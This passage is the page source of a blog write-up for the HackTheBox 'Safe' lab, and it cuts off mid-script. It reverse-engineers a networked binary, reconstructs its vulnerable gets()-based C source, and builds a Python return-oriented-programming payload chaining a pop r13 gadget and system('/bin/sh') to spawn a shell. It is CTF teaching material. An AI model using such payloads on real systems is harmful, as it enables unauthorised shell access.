@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-50Z66QSKH7"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-50Z66QSKH7');
+</script>
+
+    
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="author" content="plasticuproject">
+<meta name="description" content="Self Promoting Blog">
+<meta name="generator" content="Hugo 0.92.2" />
+<title>HackTheBox Safe Pwn Write-Up</title>
+<link rel="shortcut icon" href="https://plasticuproject.com/images/favicon.ico">
+<link rel="stylesheet" href="https://plasticuproject.com/css/style.css">
+<link rel="stylesheet" href="https://plasticuproject.com/css/highlight.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css" integrity="sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq" crossorigin="anonymous">
+
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
+
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
+        onload="renderMathInElement(document.body);"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+
+<link href="https://plasticuproject.com/index.xml" rel="alternate" type="application/rss+xml" title="plasticuproject&#39;s blog" />
+
+
+<meta property="og:title" content="HackTheBox Safe Pwn Write-Up" />
+<meta property="og:description" content="Safe is an easy difficulty Linux machine. In this write-up we will complete the binary exploitation section of the lab. We will examine a networked CLI application, find a buffer overflow vulnerability, then design and execute a return-oriented programming exploit to gain shell access to the server." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://plasticuproject.com/posts/safe-pwn-write-up/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-11T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-01-11T00:00:00+00:00" />
+
+
+
+<meta itemprop="name" content="HackTheBox Safe Pwn Write-Up">
+<meta itemprop="description" content="Safe is an easy difficulty Linux machine. In this write-up we will complete the binary exploitation section of the lab. We will examine a networked CLI application, find a buffer overflow vulnerability, then design and execute a return-oriented programming exploit to gain shell access to the server."><meta itemprop="datePublished" content="2022-01-11T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-01-11T00:00:00+00:00" />
+<meta itemprop="wordCount" content="3243">
+<meta itemprop="keywords" content="HTB,Write-Up,Pwn," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Safe Pwn Write-Up"/>
+<meta name="twitter:description" content="Safe is an easy difficulty Linux machine. In this write-up we will complete the binary exploitation section of the lab. We will examine a networked CLI application, find a buffer overflow vulnerability, then design and execute a return-oriented programming exploit to gain shell access to the server."/>
+
+
+</head>
+<body>
+    <nav class="main-nav">
+	
+		<a href='https://plasticuproject.com'>Posts</a>
+	
+
+	
+ 		<a href='/about/'>About</a>
+  	
+
+    <a href='https://plasticuproject.com/tags'>Tags</a>
+
+	
+		<a href="https://plasticuproject.com/index.xml">RSS</a>
+	
+</nav>
+
+    <section id="wrapper">
+        
+        
+<article class="post">
+    <header>
+        <h1>HackTheBox Safe Pwn Write-Up</h1>
+        <h2 class="subtitle">Safe is an easy difficulty Linux machine. In this write-up we will complete the binary exploitation section of the lab. We will examine a networked CLI application, find a buffer overflow vulnerability, then design and execute a return-oriented programming exploit to gain shell access to the server.</h2>
+        <h2 class="headline">
+        January 11, 2022
+        <br>
+          
+            
+              
+              <a href="https://plasticuproject.com/tags/htb">HTB</a>
+            
+               | 
+              <a href="https://plasticuproject.com/tags/write-up">Write-Up</a>
+            
+               | 
+              <a href="https://plasticuproject.com/tags/pwn">Pwn</a>
+            
+          
+        </h2>
+    </header>
+    <section id="post-body">
+        <p><img src="/images/safe-pwn/1.png#center" alt="HackTheBox"></p>
+<hr>
+<h2 id="getting-started">Getting Started</h2>
+<p>At this section of the lab we have found an unknown service running on port 1337 over <a href="https://en.wikipedia.org/wiki/Transmission_Control_Protocol">TCP</a> by using the <a href="https://svn.nmap.org/">Nmap</a> port scanner. We have also found what appears to be a copy of the executable binary named <strong>myapp</strong> hosted on a web server. We can download this copy of the binary and analyze it locally.</p>
+<blockquote>
+<p><em>For the purpose of this write-up I will use <a href="https://linux.die.net/man/1/socat">socat</a> to serve the application locally under the root account using sudo.</em></p>
+</blockquote>
+<p><img src="/images/safe-pwn/pics/2.png#center" alt=""></p>
+<p>Connecting to the application/service with <a href="http://netcat.sourceforge.net/">netcat</a> shows us it&rsquo;s simple functionality. First we do a quick scan with nmap to show that the port is open for connection. We connect to the service and the first thing we see is it sending system <a href="https://linux.die.net/man/1/uptime">uptime</a> information. Next we send it some test inputs (boxed in red) and receive some data back from the application (boxed in green).</p>
+<p><img src="/images/safe-pwn/pics/4.png#center" alt=""></p>
+<p>It&rsquo;s a little out of order, but it seems to echo back our input to us, seen clearly with our <em>test2</em> input. We can also infer that it is running <strong>uptime</strong> on the server and returning the output to us by testing that program in our local shell and comparing the output. As our server application and local user shell are being run on the same machine, the output is identical, nearly confirming <strong>uptime</strong> is being run by the server application.</p>
+<p><img src="/images/safe-pwn/pics/5.png#center" alt=""></p>
+<hr>
+<h2 id="initial-inspection">Initial Inspection</h2>
+<p>After downloading the <strong>myapp</strong> executable binary from the web server we run it to confirm it has the same functionality as the networked application. Running the program locally we now see it echos back our input in the correct order. I suspect this was just a quirk of how we were serving the program with socat, so moving forward it shouldn&rsquo;t be an issue.</p>
+<p><img src="/images/safe-pwn/pics/6.png#center" alt=""></p>
+<p>Running <a href="https://linux.die.net/man/1/file">file</a> and <a href="https://linux.die.net/man/1/ldd">ldd</a> shows it is a <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">64 bit ELF executable</a>, not <a href="https://en.wikipedia.org/wiki/Stripped_binary">stripped</a> of <a href="https://en.wikipedia.org/wiki/Debug_symbol">debugging information</a>, is <a href="https://en.wikipedia.org/wiki/Dynamic_linker">dynamically linked</a> and shows us the <a href="https://en.wikipedia.org/wiki/Library_(computing)#Shared_libraries">shared libraries</a>. We can see that this binary was compiled for <a href="https://www.gnu.org/">GNU/</a><a href="https://www.kernel.org/">Linux</a> and links to the system&rsquo;s installed <a href="https://en.wikipedia.org/wiki/C_standard_library">libc</a> library.</p>
+<p><img src="/images/safe-pwn/pics/7.png#center" alt=""></p>
+<p>Let&rsquo;s list out what we know so far to help us decide how to move forward:</p>
+<blockquote>
+<ul>
+<li><em>There is a networked application running on the server</em></li>
+<li><em>We can communicate with this application via TCP connection with netcat</em></li>
+<li><em>This application runs a system command and returns the output</em></li>
+<li><em>This application accepts, processes and returns user input in some way</em></li>
+<li><em>We have access to the application binary for local analysis</em></li>
+<li><em>The application was compiled for GNU/Linux and dynamically links to the C Standard Library</em></li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="buffer-overflow-vulnerability">Buffer Overflow Vulnerability</h2>
+<p>The first thing we should try is to leverage the user input functionality. This is a very simple yet powerful attack vector. If there are no <a href="https://en.wikipedia.org/wiki/Bounds_checking">bounds checking</a> or <a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection#Implementations">stack-smashing protections</a> we may be able to overrun this input <a href="https://en.wikipedia.org/wiki/Data_buffer">buffer</a> and access memory elsewhere in the <a href="https://en.wikipedia.org/wiki/Call_stack">call stack</a>, possibly allowing us to perform a <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow">stack buffer overflow</a> attack. We can test for this simply by sending different sized inputs to the program. Triggering a <a href="https://en.wikipedia.org/wiki/Segmentation_fault">segmentation fault</a> will indicate that we are writing outside of the input buffer and the program is vulnerable to this type of attack. Using <a href="https://www.python.org/">python</a> to <a href="https://www.educba.com/linux-pipe-command/">pipe</a> input to the program we are able to trigger a segmentation fault with an input of 200 characters.</p>
+<p><img src="/images/safe-pwn/pics/8.png#center" alt=""></p>
+<hr>
+<h2 id="analyzing-and-reversing">Analyzing and Reversing</h2>
+<p>We will use <a href="https://sourceware.org/gdb/">gdb</a> with the <a href="https://gef.readthedocs.io/en/master/">gef</a> extension to analyze and debug the program. Running the <a href="https://gef.readthedocs.io/en/master/commands/checksec/"><em>checksec</em></a> command will check which security protections are enabled in the binary. We can see that the <a href="https://en.wikipedia.org/wiki/NX_bit">NX bit</a> (no-execute) feature is enabled. This will prevent us from writing instructions directly onto the call stack and executing them. There is also <a href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro">partial RelRO</a> (Relocation Read-Only) protection which reorders the internal data sections to protect them from being overwritten in the event of a buffer overflow.</p>
+<blockquote>
+<p><em>&ldquo;From an attackers point-of-view, partial RELRO makes almost no difference, other than it forces the <a href="https://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0_zSeries/x2251.html#GLOBALOFFSETTABLE">GOT</a> to come before the <a href="https://refspecs.linuxbase.org/LSB_3.0.0/LSB-PDA/LSB-PDA/specialsections.html#BSS">BSS</a> in memory, eliminating the risk of a buffer overflows on a <a href="https://www.techopedia.com/definition/25617/global-variable">global variable</a> overwriting GOT entries.&quot;</em> <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
+</blockquote>
+<p><img src="/images/safe-pwn/pics/9.png#center" alt=""></p>
+<p>The <a href="https://en.wikipedia.org/wiki/Executable_space_protection">executable-space protection</a> (NX bit) stops us from simply injecting and executing arbitrary code, so let&rsquo;s dig deeper into the program and find another way we can leverage the buffer overflow. Running <a href="https://visualgdb.com/gdbreference/commands/info_functions"><em>info functions</em></a> lists the functions in the program as well as their <a href="https://en.wikipedia.org/wiki/Virtual_address_space">virtual addresses</a>.</p>
+<p><img src="/images/safe-pwn/pics/10.png#center" alt=""></p>
+<p><a href="https://en.cppreference.com/w/c/io/puts">puts</a>, <a href="https://linux.die.net/man/3/system">system</a>, <a href="https://en.cppreference.com/w/c/io/fprintf">printf</a> and <a href="https://en.cppreference.com/w/c/io/gets">gets</a> are all functions that are dynamically linked from the <strong>libc</strong> shared library. The <strong>system</strong> function really catches my eye as the purpose of this function is to execute <a href="https://www.tutorialspoint.com/what-are-shell-commands">shell commands</a>. I suspect this is what is being used to execute <strong>uptime</strong>, and we may find this useful for our exploit. <strong>main</strong> and <strong>test</strong> seem to be functions native to our program, as <strong>main</strong> is the usual entry point for <a href="https://en.wikipedia.org/wiki/The_C_Programming_Language">C programs</a> and because debugging symbols have not been stripped, <strong>test</strong> is a variable name for an included function as well. Let&rsquo;s disassemble the <strong>main</strong> function and look at the resulting <a href="https://www.intel.com/content/dam/develop/external/us/en/documents/introduction-to-x64-assembly-181178.pdf">assembly code</a>.</p>
+<p><img src="/images/safe-pwn/pics/11.png#center" alt=""></p>
+<p>This is a very simple program. We will re-create this in C below, but first I want to point out a few things. First and foremost this program is using the <strong>gets</strong> function to receive standard input from the user, which is a <strong><em>HUGE NO-NO</em></strong>. This is how we are able to buffer overflow the program&rsquo;s input.</p>
+<blockquote>
+<p><em>&ldquo;The gets() function does not perform bounds checking, therefore this function is extremely vulnerable to buffer-overflow attacks. It cannot be used safely (unless the program runs in an environment which restricts what can appear on stdin). For this reason, the function has been deprecated in the third corrigendum to the C99 standard and removed altogether in the C11 standard. fgets() and gets_s() are the recommended replacements. <strong>Never use gets()</strong>.&quot;</em> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
+</blockquote>
+<p>Now that we&rsquo;ve addressed the cause of the buffer overflow vulnerability, let&rsquo;s explore how the call to the <strong>system</strong> function works. We see that instruction <strong>&lt;+8&gt;</strong> is <a href="https://www.felixcloutier.com/x86/lea">loading</a> an address into the <strong>RDI</strong> register, then instruction <strong>&lt;+15&gt;</strong> is calling the <strong>system</strong> function. The <strong>RDI</strong> register is used to store the address of the first argument for function calls in <a href="https://courses.cs.washington.edu/courses/cse378/10au/sections/Section1_recap.pdf">Linux x86_64</a>. When we run the <a href="https://courses.cs.washington.edu/courses/cse351/20au/gdb/gdbnotes-x86-64.pdf"><em>x/s</em></a> command on that address, we see it points to the string &ldquo;<em>/usr/bin/uptime</em>&rdquo;, so we know the program is executing <strong>system(&quot;/usr/bin/uptime&rdquo;)</strong>, completely confirming our earlier assumption. Understanding how this works will be crucial to the development of our exploit. I also want to point out that the <strong>test</strong> function is not referenced at all in <strong>main</strong>. Normally this could be because the function is an artifact of the development process, or <a href="https://en.wikipedia.org/wiki/Dead_code">dead code</a>, but here I suspect it was created for us to use in our exploitation of this program. Let&rsquo;s disassemble <strong>test</strong> and see what it does.</p>
+<p><img src="/images/safe-pwn/pics/12.png#center" alt=""></p>
+<p>From what I can tell, this function really isn&rsquo;t doing anything useful, aside from giving us something to use in our exploit. All it does is push the value contained in the <strong>RBP</strong> register onto the call stack, <a href="https://www.felixcloutier.com/x86/mov">moves</a> the address pointing to that value into the <strong>RDI</strong> register via the <strong>RSP</strong> register, jumps to the address stored in the <strong>R13</strong> register, pops <strong>RBP</strong> off of the call stack, and finally returns to the calling function. I&rsquo;m not even sure how we could write this in C, but for our source reconstruction we can just use the <a href="https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html">__asm__</a> keyword to write the assembly code directly in our C source re-creation.</p>
+<p>Here is my attempt at re-creating the original C source code for this program with comments added to help understand what each line translates to in assembly code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// my_source_myapp.c
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">// gcc my_source_myapp.c -o my_source_myapp -fno-stack-protector -no-pie -w
+</span><span style="color:#75715e"></span>
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+
+    <span style="color:#66d9ef">char</span> echo[<span style="color:#ae81ff">112</span>];  <span style="color:#75715e">//..................................// sub    rsp,0x70
+</span><span style="color:#75715e"></span>
+    system(<span style="color:#e6db74">&#34;/usr/bin/uptime&#34;</span>);  <span style="color:#75715e">//.......................// lea    rdi,[rip+0xe9a] # 0x402008
+</span><span style="color:#75715e"></span>                                <span style="color:#75715e">//.......................// call   0x401040 &lt;system@plt&gt;
+</span><span style="color:#75715e"></span>
+    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">What do you want me to echo back? &#34;</span>);  <span style="color:#75715e">//..// lea    rdi,[rip+0xe9e] # 0x402018
+</span><span style="color:#75715e"></span>                                                     <span style="color:#75715e">//..// call   0x401050 &lt;printf@plt&gt;
+</span><span style="color:#75715e"></span>
+    gets(echo);  <span style="color:#75715e">//......................................// lea    rax,[rbp-0x70]
+</span><span style="color:#75715e"></span>                 <span style="color:#75715e">//......................................// mov    rdi,rax
+</span><span style="color:#75715e"></span>                 <span style="color:#75715e">//......................................// call   0x401060 &lt;gets@plt&gt;
+</span><span style="color:#75715e"></span>
+    puts(echo);  <span style="color:#75715e">//......................................// lea    rax,[rbp-0x70]
+</span><span style="color:#75715e"></span>                 <span style="color:#75715e">//......................................// mov    rdi,rax
+</span><span style="color:#75715e"></span>                 <span style="color:#75715e">//......................................// call   0x401030 &lt;puts@plt&gt;
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;    <span style="color:#75715e">//......................................// mov    eax,0x0
+</span><span style="color:#75715e"></span>                 <span style="color:#75715e">//......................................// leave
+</span><span style="color:#75715e"></span>                 <span style="color:#75715e">//......................................// ret
+</span><span style="color:#75715e"></span>}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">test</span>(<span style="color:#66d9ef">void</span>) {
+    __asm__(
+        <span style="color:#e6db74">&#34;mov %rsp,%rdi</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#e6db74">&#34;jmpq *%r13&#34;</span>
+	);
+}
+</code></pre></div><p>Compiling using <a href="https://gcc.gnu.org/">gcc</a> with the flags listed at the top creates nearly identical assembly code for me when inspected with <a href="https://linux.die.net/man/1/objdump"><em>objdump</em></a>. There are a few unimportant discrepancies, but those are probably the result of minor compiler version/optimization differences and shouldn&rsquo;t be an issue.</p>
+<p><img src="/images/safe-pwn/pics/29.png#center" alt=""></p>
+<p><img src="/images/safe-pwn/pics/30.png#center" alt=""></p>
+<hr>
+<h2 id="debugging-and-finding-the-offset">Debugging and Finding the Offset</h2>
+<p>Let&rsquo;s run the program in gdb, setting a <a href="https://visualgdb.com/gdbreference/commands/break">breakpoint</a> at the call to <strong>system</strong> to examine the registers at this state of the program runtime. Here we can see that the address pointing to the &ldquo;<em>uptime</em>&rdquo; string has been loaded into the <strong>RDI</strong> register and the <strong>RIP</strong> (instruction pointer) register contains the address of the <strong>system</strong> function. The program is set up and ready to execute <strong>system(&quot;/usr/bin/uptime&rdquo;)</strong> at continuation of execution.</p>
+<p><img src="/images/safe-pwn/pics/13.png#center" alt="">
+<img src="/images/safe-pwn/pics/15.png#center" alt="">
+<img src="/images/safe-pwn/pics/14.png#center" alt=""></p>
+<p>Now let&rsquo;s halt execution and explore the buffer overflow vulnerability. We&rsquo;ll first <a href="https://visualgdb.com/gdbreference/commands/delete">delete</a> the previous breakpoint then use the <a href="https://gef.readthedocs.io/en/master/commands/pattern/">pattern create</a> command to generate a <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn</a> cyclic pattern of 200 bytes, as we know 200 bytes will cause a segmentation fault and overrun the input buffer used by <strong>gets</strong> (which we assigned the variable name <strong><em>echo</em></strong> to in our source re-creation). Then we run the program and use that pattern when prompted to supply our input.</p>
+<p><img src="/images/safe-pwn/pics/16.png#center" alt=""></p>
+<p>As expected we receive a segmentation fault, but now we can examine the current state of the program at the fault and see where are our input is being written.</p>
+<p><img src="/images/safe-pwn/pics/17.png#center" alt=""></p>
+<p>Using the pattern search command we can see how many bytes we need to input to overwrite the <strong>RSP</strong> register. The <strong>RSP</strong> register contains the address the current function will return to when the <strong>ret</strong> instruction is called. This shows that we need to input 120 bytes to reach the <strong>RSP</strong> register. We could then write any valid address to that register and that is where the <strong>main</strong> function will return. Also note that we are overwriting the <strong>RBP</strong> register as well. When we search for the contents of what <strong>RBP</strong> contains, we see that it is 112 bytes past the start of our input buffer, or <em>0x70</em> in hexadecimal, as the assembly code shows us.</p>
+<p><img src="/images/safe-pwn/pics/26.png#center" alt=""></p>
+<p>So let&rsquo;s recap how our input is handled:</p>
+<blockquote>
+<ul>
+<li><em>The first 112 bytes write to the input buffer, or <strong>RSI</strong> register</em></li>
+<li><em>Bytes 113-120 overwrite the <strong>RBP</strong> register</em></li>
+<li><em>Bytes 120+ overwrite the <strong>RSP</strong> register, which is the address where the function will return</em></li>
+</ul>
+</blockquote>
+<p> </p>
+<p>If we only send 112 bytes of junk followed by an 8 byte <a href="https://en.wikipedia.org/wiki/String_(computer_science)">string</a>, &ldquo;<em>deadbeef</em>&rdquo;, we can write that string into the <strong>RBP</strong> register.</p>
+<p><img src="/images/safe-pwn/pics/18.png#center" alt=""></p>
+<hr>
+<h2 id="return-oriented-programming">Return-Oriented Programming</h2>
+<p>The limitied binary protections, buffer overflow vulnerability via <strong>gets</strong> function for user supplied input and easy access to the <strong>system</strong> function make this program a prime candidate for <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">return-oriented programing</a> exploitation, or <em>ROP</em> for short.</p>
+<blockquote>
+<p><em>&ldquo;The concept of ROP is simple but tricky. . . [W]e wil[l] be utilizing small instruction sequences available in either the binary or libraries linked to the application called gadgets. . . ROP gadgets are small instruction sequences ending with a “ret” instruction “c3”. Combining these gadgets will enable us to perform certain tasks and in the end conduct our attack . . . [I]nstead of returning to an address of a function . . . we will return to these ROP gadgets. . . The ROP gadget has to end with a “ret” to enable us to perform multiple sequences. Hence it is called return oriented.&quot;</em> <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
+</blockquote>
+<p>Utilizing the ROP method we can find and chain together useful instruction sequences already present in the binary, essentially re-writing the program to do whatever we want by rearranging pre-existing code. Our ultimate goal here is to find and use ROP gadgets to help us massage program data and <a href="https://en.wikipedia.org/wiki/Control_flow">control flow</a> in a way that spawns a <a href="https://en.wikipedia.org/wiki/Fork_(system_call)">forked</a> <a href="https://en.wikipedia.org/wiki/Shell_%28computing%29">command-line shell</a> process through execution of the binary.</p>
+<p><a href="https://ropemporium.com/">ROPEmporium</a> is a great resource to learn more about ROP exploitation and practice your exploit building skills.</p>
+<hr>
+<h2 id="developing-a-rop-exploit">Developing a ROP Exploit</h2>
+<p>Using python we can start to build a framework for our ROP exploit. In our python <strong>test</strong> function we will construct our input by first sending 112 bytes of &ldquo;<em>A</em>&ldquo;s followed by our 8 byte payload string, &ldquo;<em>deadbeef</em>&rdquo;, followed by the address to <strong>myapp</strong>&rsquo;s <strong>test</strong> function (using python&rsquo;s <a href="https://docs.python.org/3.8/library/struct.html#module-struct">struct module</a> to pack the bytes into proper 8 byte <a href="https://en.wikipedia.org/wiki/Endianness">little endian</a> format). The function then writes this to a file named <em>test_payload.txt</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#e6db74">&#34;&#34;&#34;safe_pwn.py&#34;&#34;&#34;</span>
+
+<span style="color:#f92672">import</span> struct
+
+<span style="color:#75715e"># test</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>() <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">None</span>:
+    <span style="color:#e6db74">&#34;&#34;&#34;Test return to test function.&#34;&#34;&#34;</span>
+    payload: bytes <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">112</span>)  <span style="color:#75715e"># 112 bytes of &#39;A&#39;s to fill input buffer</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;deadbeef&#34;</span>  <span style="color:#75715e"># string to write into rbp</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x401152</span>)  <span style="color:#75715e"># address of test function</span>
+    print(<span style="color:#e6db74">&#34;Our test payload:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;test_payload.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> test_out:
+        test_out<span style="color:#f92672">.</span>write(payload)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    test()
+</code></pre></div><p>We run the new python script and generate our ROP test input.</p>
+<p><img src="/images/safe-pwn/pics/21.png#center" alt=""></p>
+<p>Now we set a breakpoint at the address of <strong>myapp</strong>&rsquo;s <strong>test</strong> function and run the program using our generated payload as the input with <em>run &lt; payload.txt</em>. At the breakpoint we see that now <strong>RBP</strong> contains the string &ldquo;<em>deadbeef</em>&rdquo; and <strong>RIP</strong> contains the address of <strong>test</strong>, showing that the <strong>test</strong> function is the next <a href="https://en.wikipedia.org/wiki/Subroutine">subroutine</a> the program will execute.</p>
+<p><img src="/images/safe-pwn/pics/19.png#center" alt=""></p>
+<p>Stepping over the call to <strong>test</strong> with command <a href="https://www.tutorialspoint.com/gnu_debugger/gdb_commands.htm"><em>n</em></a> shows us how the function has set up the call stack. The function prologue pushes the value <strong>RBP</strong> contains onto the stack, decrementing <strong>RSP</strong> 8 bytes. It then copies the contents of <strong>RSP</strong> into <strong>RBP</strong>, so they now both contain the stack address pointing to &ldquo;<em>deadbeef</em>&rdquo;. Directly after the function prologue, <strong>test</strong> copies the value of <strong>RSP</strong> to the <strong>RDI</strong> register. Now all three registers, <strong>RBP</strong>, <strong>RSP</strong> and <strong>RDI</strong>, point to the string value &ldquo;<em>deadbeef</em>&rdquo;.</p>
+<p><img src="/images/safe-pwn/pics/27.png#center" alt=""></p>
+<p><em>jmp  r13</em> is the next instruction <strong>test</strong> will execute after it copies the stack address of &ldquo;<em>deadbeef</em>&rdquo; into <strong>RDI</strong>.  Currently the <strong>R13</strong> register doesn&rsquo;t contain anything useful, but if it contained a valid address to another function, <strong>test</strong> would then jump to that function and execute it. We need to get a useful string address into <strong>RDI</strong>, then get the address of the <strong>system</strong> function into <strong>R13</strong>. That way we can call <strong>system</strong> with our payload string as it&rsquo;s argument, as per the <a href="https://wiki.osdev.org/Calling_Conventions">System V X86_64 calling convention</a>. If we get <strong>RDI</strong> to point to the string &ldquo;<em><a href="https://linux.die.net/man/1/sh">/bin/sh</a></em>&rdquo;, then jump to the <strong>system</strong> address we would spawn a command-line shell  on the host machine.</p>
+<p>This is where we can utilize the ROP exploitation method. If we can find a ROP <em>gadget</em> (machine instruction sequence accessible by the program that ends with a <a href="https://www.felixcloutier.com/x86/ret">return instruction</a>) that can <em>pop <strong>R13</strong></em> off of the call stack, we can write the address of the <strong>system</strong> function to the register and then jump to it in the <strong>test</strong> function. We could manually search for a gadget but a better option would be to use the python tool <a href="https://scoding.de/ropper/">ropper</a>. Using this tool within gdb-gef we can easily search for a gadget containing &ldquo;<em>pop r13</em>&rdquo; with the command <em><a href="https://gef.readthedocs.io/en/master/commands/ropper/">ropper &ndash;search &ldquo;pop r13&rdquo;</a></em>.</p>
+<p><img src="/images/safe-pwn/pics/20.png#center" alt=""></p>
+<p>ropper has found a gadget we can use at the virtual address <em>0x401206</em>. This gadget not only pops <strong>R13</strong>, but also pops registers <strong>R14</strong> and <strong>R15</strong> before it executes the return instruction. These extra instructions will not be an issue, we can write <em>0x0</em> to those registers as they will not be used in our exploit.</p>
+<hr>
+<h2 id="testing-our-exploit-method">Testing Our Exploit Method</h2>
+<p>Let&rsquo;s list out what we need to send to the program in order to set up a shell command call for <em>/bin/sh</em>:</p>
+<blockquote>
+<ul>
+<li><em>112 bytes of junk to fill the input buffer</em></li>
+<li><em>8 byte string for our <strong>system</strong> argument to overwrite <strong>RBP</strong></em></li>
+<li><em>Address of our ROP gadget to pop registers <strong>R13</strong>, <strong>R14</strong>, <strong>R15</strong> and then <strong>ret</strong> to overwrite <strong>RSP</strong></em></li>
+<li><em>Address of the <strong>system</strong> function to write to <strong>R13</strong></em></li>
+<li><em>0x0 to write to <strong>R14</strong></em></li>
+<li><em>0x0 to write to <strong>R15</strong></em></li>
+<li><em>Address of the <strong>test</strong> function to write to <strong>RSP</strong></em></li>
+</ul>
+</blockquote>
+<p> </p>
+<p>We will adapt our previous python test function to include our new payload instructions and write the data to the file <em>payload.txt</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#e6db74">&#34;&#34;&#34;safe_pwn.py&#34;&#34;&#34;</span>
+
+<span style="color:#f92672">import</span> struct
+
+<span style="color:#75715e"># payload</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>() <span style="color:#f92672">-&gt;</span> bytes:
+    <span style="color:#e6db74">&#34;&#34;&#34;Build our payload.&#34;&#34;&#34;</span>
+    payload: bytes <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">112</span>)  <span style="color:#75715e"># overflow junk</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>  <span style="color:#75715e"># rbp : string argument for system function</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x401206</span>)  <span style="color:#75715e"># pop r13 ; pop r14 ; pop r15 ; ret</span>
+    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, <span style="color:#ae81ff">0x401040</span>)  <span style="color:#75715e"># r13 -&gt; system</span>
